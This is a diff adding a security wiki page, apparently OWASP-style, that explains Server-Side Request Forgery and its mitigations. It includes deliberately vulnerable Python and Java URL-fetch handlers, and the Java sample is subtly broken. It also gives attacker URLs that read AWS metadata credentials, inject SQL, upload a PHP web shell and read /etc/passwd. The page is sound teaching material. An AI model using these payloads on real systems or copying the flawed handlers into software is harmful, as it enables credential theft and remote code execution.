@@ -1,0 +1,108 @@
+---
+
+layout: col-sidebar
+title: Server-Side Request Forgery (SSRF)
+author: Vaibhav Malik
+tags: [attack, XSS, etc]
+
+---
+
+ {% include writers.html %}
+
+Server-Side Request Forgery (SSRF)
+
+
+Overview
+Server-Side Request Forgery (SSRF) is a type of exploit where an attacker abuses functionality on the server to read or update internal resources. The attacker can supply or modify a URL to which the code running on the server will read or submit data. By carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP-enabled databases, or perform post requests towards internal services that are not intended to be exposed.
+
+Risk Factors
+- Prevalence: Increasingly common vulnerability as modern web applications provide end users with convenient features
+- Detectability: Can be difficult to detect in a penetration test that lacks access to source code since they are deep within the application code
+- Exploitability: High impact, especially in cloud-based applications due to the variety of services that can be accessed via HTTP within cloud providers
+- Impact: Ranges from sensitive data exposure to remote code execution depending what the attacked server can communicate with 
+
+Examples
+Example 1: AWS EC2 SSRF to Access Metadata 
+In a cloud environment like AWS EC2, an SSRF vulnerability could allow an attacker to hit the [[http://169.254.169.254]{.underline}](http://169.254.169.254) endpoint contains sensitive instance metadata, including access keys. 
+
+Vulnerable code:
+```python
+import requests
+def fetch_url(url):
+    return requests.get(url).content
+
+@app.route('/servicestatus')
+def status():
+    url = request.args.get("url")
+    return fetch_url(url)
+```
+
+Attacker supplied URL:
+[[http://example.com/servicestatus?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME]{.underline}](http://example.com/servicestatus?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME)
+
+This would return the Access Key ID, Secret Access Key, and Token assigned to that EC2 instance, allowing the attacker to perform further malicious actions in the AWS environment.
+
+Example 2: SSRF to Access Internal Services
+An attacker could abuse an SSRF vulnerability to access internal HTTP services that are not publicly accessible, such as an admin panel or database.
+
+Vulnerable code:
+```java
+@RequestMapping("/stock")
+public String stock status(@RequestParam("prodid") String productId) {
+  String url = "http://internal-api/product/" + productId + "/status";
+  URL obj = new URL(url);
+  URLConnection conn = obj.openConnection();
+
+  BufferedReader in = new BufferedReader(
+        new InputStreamReader(conn.getInputStream()));
+  String status = in.readLines();
+  in.close();
+
+  return status;
+}
+```
+
+Attacker supplied product ID: 
+[[http://example.com/stock?prodid=1+AND+1=0+UNION+SELECT+NULL,version(),NULL--]{.underline}](http://example.com/stock?prodid=1+AND+1=0+UNION+SELECT+NULL,version(),NULL--)
+
+This input would cause the application to fetch 
+[[http://internal-api/product/1+AND+1=0+UNION+SELECT+NULL,version(),NULL--/status]{.underline}](http://internal-api/product/1+AND+1=0+UNION+SELECT+NULL,version(),NULL--/status)
+
+The attacker can retrieve the database version string if the internal API has an SQL injection vulnerability. The attacker could continue to exploit the internal SQL injection to extract data or potentially write files.
+
+Example 3: SSRF Chain to RCE
+If an internal admin panel is exposed through an SSRF vulnerability and has an additional vulnerability, such as a file upload feature, this could be chained into remote code execution.
+
+Attacker supplied URL:
+[[http://example.com/servicestatus?url=http://internal-admin/uploadimg]{.underline}](http://example.com/servicestatus?url=http://internal-admin/uploadimg)
+POST /uploadimg
+Content-Type: multipart/form-data; boundary=123456
+--123456
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+<?php system($_GET['cmd']); ?>
+--123456--
+
+This would upload a malicious PHP web shell to the internal admin application. The attacker can then call their web shell to execute arbitrary commands:
+
+[[http://example.com/servicestatus?url=http://internal-admin/uploads/shell.php&cmd=cat+/etc/passwd]{.underline}](http://example.com/servicestatus?url=http://internal-admin/uploads/shell.php&cmd=cat+/etc/passwd)
+
+Related 
+[Threat Agents]
+[Category:Internet_attacker]
+
+
+Related [Attacks]
+[Web Parameter Tampering]
+[XXE]
+Related [Vulnerabilities]
+[Category:Input Validation Vulnerability]
+Related [Controls]
+[Validation of all client supplied input]
+[Whitelist permitted URL schemas and enforce URL schema validation]
+[Segment remote resource access functionality in separate networks]
+References
+[CWE-918: Server-Side Request Forgery]
+[OWASP SSRF Cheat Sheet]
+
+
+
